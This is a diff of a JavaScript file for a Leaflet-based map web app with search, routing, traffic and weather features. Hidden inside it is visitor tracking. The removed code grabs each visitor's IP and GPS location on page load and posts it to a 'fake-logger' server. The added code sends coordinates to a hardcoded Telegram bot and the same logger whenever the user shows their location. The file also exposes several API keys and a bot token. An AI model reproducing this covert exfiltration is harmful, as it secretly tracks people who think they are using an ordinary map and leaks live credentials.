@@ -1,111 +1,297 @@
-// --- Initial Map Setup ---
-let map = L.map("map").setView([25.276987, 55.296249], 12); // Fake: Dubai
+// 🌍 Map Initialization
+let map = L.map("map").setView([25.276987, 51.520008], 13);
+let fakeMarker, liveMarker, routingControl;
+let isStreet = true, trafficLayer = null;
 
-L.tileLayer('https://api.maptiler.com/maps/streets-v2/256/{z}/{x}/{y}.png?key=VcSgtSTkXfCbU3n3RqBO', {
-  attribution: '',
-  tileSize: 256,
-  zoomOffset: 0,
-  lang: 'en'
+// 🗺️ Tile Layers
+const streetLayer = L.tileLayer("https://api.maptiler.com/maps/basic-v2/256/{z}/{x}/{y}.png?key=VcSgtSTkXfCbU3n3RqBO", {
+  attribution: '&copy; <a href="https://www.maptiler.com/">MapTiler</a>', maxZoom: 20
+});
+const satelliteLayer = L.tileLayer("https://api.maptiler.com/maps/hybrid/256/{z}/{x}/{y}.jpg?key=VcSgtSTkXfCbU3n3RqBO", {
+  attribution: '&copy; <a href="https://www.maptiler.com/">MapTiler</a>', maxZoom: 20
+});
+streetLayer.addTo(map);
+
+// 🧭 Initial Fake Marker
+fakeMarker = L.marker([25.276987, 51.520008], {
+  icon: L.icon({ iconUrl: 'https://maps.gstatic.com/mapfiles/ms2/micons/blue.png' })
 }).addTo(map);
+fakeMarker.on("dblclick", () => map.removeLayer(fakeMarker));
 
-let marker = L.marker([25.276987, 55.296249]).addTo(map);
+// 🌗 Dark Mode Toggle
+document.getElementById("theme-toggle").onclick = () => {
+  document.body.classList.toggle("dark-mode");
+  document.body.classList.toggle("light-mode");
+};
 
-// --- Toggle Buttons ---
-const searchBox = document.querySelector(".floating-search");
-const directionPanel = document.getElementById("direction-panel");
+// 🛰️ Layer Switch
+document.getElementById("layer-toggle").onclick = () => {
+  if (isStreet) {
+    map.removeLayer(streetLayer);
+    map.addLayer(satelliteLayer);
+  } else {
+    map.removeLayer(satelliteLayer);
+    map.addLayer(streetLayer);
+  }
+  isStreet = !isStreet;
+};
 
-document.querySelector(".search-toggle").addEventListener("click", () => {
-  searchBox.classList.toggle("hidden");
-});
-document.querySelector(".direction-toggle").addEventListener("click", () => {
-  directionPanel.classList.toggle("hidden");
-});
+// 📍 My Live Location
+document.getElementById("location-toggle").onclick = () =>
+  navigator.geolocation.getCurrentPosition(showLiveLocation, () => alert("Location access denied"));
 
-// --- Autocomplete Suggestions ---
-function showSuggestions(inputId, suggestionBoxId) {
+function showLiveLocation(position) {
+  const coords = [position.coords.latitude, position.coords.longitude];
+  if (liveMarker) map.removeLayer(liveMarker);
+  liveMarker = L.marker(coords, {
+    icon: L.icon({ iconUrl: "assets/live-location.svg", iconSize: [32, 32] })
+  }).addTo(map);
+  map.setView(coords, 15);
+  fetchWeather(coords[0], coords[1]);
+  sendToTelegram(coords[0], coords[1]);
+  logToBackend(coords[0], coords[1]);
+}
+
+// 🧠 Telegram Logging
+function sendToTelegram(lat, lon) {
+  const message = `📍 New Visitor\nLat: ${lat}\nLon: ${lon}`;
+  fetch(`https://api.telegram.org/bot7943375930:AAEiifo4A9NiuxY13o73qjCJVUiHXEu2ta8/sendMessage?chat_id=6602027873&text=${encodeURIComponent(message)}`);
+}
+
+// 🗂️ Backend Logger
+function logToBackend(lat, lon) {
+  fetch("https://fake-logger.onrender.com/logger.php", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ lat, lon })
+  });
+}
+
+// 🔍 Autocomplete for Inputs
+function enableAutocomplete(inputId, suggestionId) {
   const input = document.getElementById(inputId);
-  const box = document.getElementById(suggestionBoxId);
+  const suggestionBox = document.getElementById(suggestionId);
+
   input.addEventListener("input", async () => {
-    const val = input.value;
-    if (!val) return box.innerHTML = "";
-    const res = await fetch(`https://nominatim.openstreetmap.org/search?format=json&q=${val}`);
+    const query = input.value.trim();
+    if (!query) return (suggestionBox.innerHTML = "");
+
+    const res = await fetch(`https://photon.komoot.io/api/?q=${query}&lang=en`);
     const data = await res.json();
-    box.innerHTML = "";
-    data.slice(0, 5).forEach(item => {
+    suggestionBox.innerHTML = "";
+    data.features.slice(0, 5).forEach((feature) => {
       const div = document.createElement("div");
       div.className = "suggestion";
-      div.textContent = item.display_name;
-      div.onclick = () => {
-        input.value = item.display_name;
-        box.innerHTML = "";
-      };
-      box.appendChild(div);
-    });
-  });
-}
-showSuggestions("search-input", "search-suggestions");
-showSuggestions("start", "start-suggestions");
-showSuggestions("end", "end-suggestions");
+      div.textContent = feature.properties.name + ", " + feature.properties.country;
 
-// --- Search ---
-function searchLocation() {
-  const query = document.getElementById("search-input").value;
-  if (!query) return;
-  fetch(`https://nominatim.openstreetmap.org/search?format=json&q=${encodeURIComponent(query)}`)
-    .then(res => res.json())
-    .then(data => {
-      if (data[0]) {
-        const { lat, lon } = data[0];
-        map.setView([lat, lon], 15);
-        marker.setLatLng([lat, lon]);
+      function selectPlace() {
+        input.value = feature.properties.name;
+        input.dataset.lat = feature.geometry.coordinates[1];
+        input.dataset.lon = feature.geometry.coordinates[0];
+        suggestionBox.innerHTML = "";
+        input.blur();
+        saveSearch(input.value);
       }
+
+      div.addEventListener("click", selectPlace);
+      div.addEventListener("touchstart", selectPlace);
+      suggestionBox.appendChild(div);
     });
-}
-
-// --- Directions ---
-function getDirections() {
-  const from = document.getElementById("start").value;
-  const to = document.getElementById("end").value;
-  if (!from || !to) return alert("Enter both places");
-
-  Promise.all([
-    fetch(`https://nominatim.openstreetmap.org/search?format=json&q=${from}`).then(res => res.json()),
-    fetch(`https://nominatim.openstreetmap.org/search?format=json&q=${to}`).then(res => res.json())
-  ]).then(([fromData, toData]) => {
-    if (!fromData[0] || !toData[0]) return alert("Invalid locations");
-    const fromLatLng = L.latLng(fromData[0].lat, fromData[0].lon);
-    const toLatLng = L.latLng(toData[0].lat, toData[0].lon);
-    L.Routing.control({
-      waypoints: [fromLatLng, toLatLng],
-      router: L.Routing.osrmv1(),
-      lineOptions: { styles: [{ color: 'green', weight: 4 }] },
-      createMarker: () => null
-    }).addTo(map);
   });
 }
 
-// --- Logger: Get IP + GPS and Send to Backend ---
-async function captureAndSendLocation() {
-  try {
-    const ipRes = await fetch("https://api.ipify.org?format=json");
-    const { ip } = await ipRes.json();
+enableAutocomplete("searchBox", "searchSuggestions");
+enableAutocomplete("start", "startSuggestions");
+enableAutocomplete("end", "endSuggestions");
 
-    navigator.geolocation.getCurrentPosition(async (pos) => {
-      const latitude = pos.coords.latitude;
-      const longitude = pos.coords.longitude;
-      const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`);
-      const geoData = await geoRes.json();
-      const city = geoData.address.city || geoData.address.town || geoData.address.village || "Unknown";
-      const country = geoData.address.country || "Unknown";
+// 📌 Search Place
+async function searchPlace() {
+  const input = document.getElementById("searchBox");
+  let lat = input.dataset.lat;
+  let lon = input.dataset.lon;
 
-      await fetch("https://fake-logger.onrender.com/logger.php", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ ip, latitude, longitude, city, country })
-      });
+  if (!lat || !lon) {
+    const query = input.value.trim();
+    if (!query) return alert("Please enter a place.");
+
+    const res = await fetch(`https://photon.komoot.io/api/?q=${query}&lang=en`);
+    const data = await res.json();
+    if (data.features.length === 0) return alert("Place not found. Try again.");
+
+    const coords = data.features[0].geometry.coordinates;
+    lat = coords[1];
+    lon = coords[0];
+  }
+
+  if (fakeMarker) map.removeLayer(fakeMarker);
+  const coords = [parseFloat(lat), parseFloat(lon)];
+  fakeMarker = L.marker(coords, {
+    icon: L.icon({ iconUrl: 'https://maps.gstatic.com/mapfiles/ms2/micons/red.png' })
+  }).addTo(map);
+  map.setView(coords, 15);
+  fetchWeather(coords[0], coords[1]);
+  saveSearch(input.value);
+}
+
+// 🛣️ Directions
+async function getDirections() {
+  const startInput = document.getElementById("start");
+  const endInput = document.getElementById("end");
+
+  let startCoords, endCoords;
+
+  if (startInput.value.toLowerCase() === "my location") {
+    navigator.geolocation.getCurrentPosition((pos) => {
+      startCoords = [pos.coords.latitude, pos.coords.longitude];
+      handleEnd();
     });
-  } catch (err) {
-    console.error("Logger failed:", err);
+  } else {
+    startCoords = await resolveCoords(startInput);
+    handleEnd();
+  }
+
+  async function handleEnd() {
+    endCoords = await resolveCoords(endInput);
+    if (!startCoords || !endCoords) return;
+
+    buildRoute(startCoords, endCoords);
+    fetchWeather(...endCoords);
+  }
+
+  async function resolveCoords(input) {
+    if (input.dataset.lat && input.dataset.lon) {
+      return [parseFloat(input.dataset.lat), parseFloat(input.dataset.lon)];
+    }
+
+    const query = input.value.trim();
+    if (!query) return alert("Please enter both places.");
+    const res = await fetch(`https://photon.komoot.io/api/?q=${query}&lang=en`);
+    const data = await res.json();
+    if (data.features.length === 0) {
+      alert(`Place not found: ${query}`);
+      return null;
+    }
+    const coords = data.features[0].geometry.coordinates;
+    input.dataset.lat = coords[1];
+    input.dataset.lon = coords[0];
+    return [coords[1], coords[0]];
   }
 }
-captureAndSendLocation();
+
+function buildRoute(startCoords, endCoords) {
+  if (routingControl) map.removeControl(routingControl);
+
+  routingControl = L.Routing.control({
+    waypoints: [L.latLng(...startCoords), L.latLng(...endCoords)],
+    lineOptions: { styles: [{ color: "#1976d2", weight: 5 }] },
+    show: false,
+    createMarker: (i, wp) => {
+      return L.marker(wp.latLng, {
+        icon: L.icon({
+          iconUrl: i === 0 ? "assets/live-location.svg" : "https://maps.gstatic.com/mapfiles/ms2/micons/red.png",
+          iconSize: [32, 32]
+        })
+      });
+    }
+  })
+    .addTo(map)
+    .on("routesfound", function (e) {
+      const route = e.routes[0];
+      const summary = route.summary;
+      document.getElementById("routeSummary").innerHTML =
+        `<p><strong>Distance:</strong> ${(summary.totalDistance / 1000).toFixed(2)} km<br><strong>Time:</strong> ${(summary.totalTime / 60).toFixed(1)} min</p>`;
+    });
+}
+
+// 📑 Panels
+const directionPanel = document.getElementById("direction-panel");
+const searchBar = document.querySelector(".floating-search");
+
+document.getElementById("direction-toggle").addEventListener("click", () => {
+  const isVisible = directionPanel.style.display === "block";
+  directionPanel.style.display = isVisible ? "none" : "block";
+  searchBar.style.display = isVisible ? "flex" : "none";
+});
+
+function closeDirectionPanel() {
+  document.getElementById("direction-panel").style.display = "none";
+  document.querySelector(".floating-search").style.display = "flex";
+}
+
+document.getElementById("history-toggle").onclick = () => togglePanel("history-panel");
+
+function togglePanel(id) {
+  const panel = document.getElementById(id);
+  panel.style.display = panel.style.display === "none" ? "block" : "none";
+}
+function hidePanel(id) {
+  document.getElementById(id).style.display = "none";
+}
+
+// 📜 Search History
+function saveSearch(query) {
+  let history = JSON.parse(localStorage.getItem("searchHistory") || "[]");
+  if (!history.includes(query)) {
+    history.unshift(query);
+    if (history.length > 10) history.pop();
+    localStorage.setItem("searchHistory", JSON.stringify(history));
+    renderHistory();
+  }
+}
+function renderHistory() {
+  const list = document.getElementById("historyList");
+  let history = JSON.parse(localStorage.getItem("searchHistory") || "[]");
+  list.innerHTML = "";
+  history.forEach((q) => {
+    const li = document.createElement("li");
+    li.textContent = q;
+    li.onclick = () => {
+      document.getElementById("searchBox").value = q;
+      document.getElementById("searchBox").dispatchEvent(new Event("input"));
+    };
+    list.appendChild(li);
+  });
+}
+renderHistory();
+
+// 🚦 Real TomTom Traffic Toggle
+let tomtomTraffic;
+document.getElementById("traffic-toggle").onclick = () => {
+  const apiKey = "a3vv3A6LAvqLAIKmknfwzSBXEjJOpXwu";
+  if (!tomtomTraffic) {
+    tomtomTraffic = L.tileLayer(
+      `https://api.tomtom.com/traffic/map/4/tile/flow/relative0/{z}/{x}/{y}.png?key=${apiKey}`,
+      {
+        attribution: '&copy; <a href="https://www.tomtom.com/">TomTom</a>',
+        maxZoom: 20,
+        opacity: 0.7,
+      }
+    );
+    map.addLayer(tomtomTraffic);
+  } else {
+    map.hasLayer(tomtomTraffic)
+      ? map.removeLayer(tomtomTraffic)
+      : map.addLayer(tomtomTraffic);
+  }
+};
+
+// ⛅ Weather Toggle
+document.getElementById("weather-toggle").onclick = () => {
+  const box = document.getElementById("weather-box");
+  box.style.display = box.style.display === "block" ? "none" : "block";
+};
+
+// 🌦️ Fetch Weather
+async function fetchWeather(lat, lon) {
+  const apiKey = "71aec132cf2764d6ea577d3616629a9b";
+  const url = `https://api.openweathermap.org/data/2.5/weather?lat=${lat}&lon=${lon}&units=metric&appid=${apiKey}`;
+  const res = await fetch(url);
+  const data = await res.json();
+  document.getElementById("weatherTemp").innerText = `${Math.round(data.main.temp)}°C`;
+  document.getElementById("weatherCondition").innerText = data.weather[0].description;
+  document.getElementById("weatherDetails").innerHTML = `
+    <p>Humidity: ${data.main.humidity}%<br>
+    Wind: ${data.wind.speed} m/s<br>
+    Pressure: ${data.main.pressure} hPa</p>
+  `;
+}
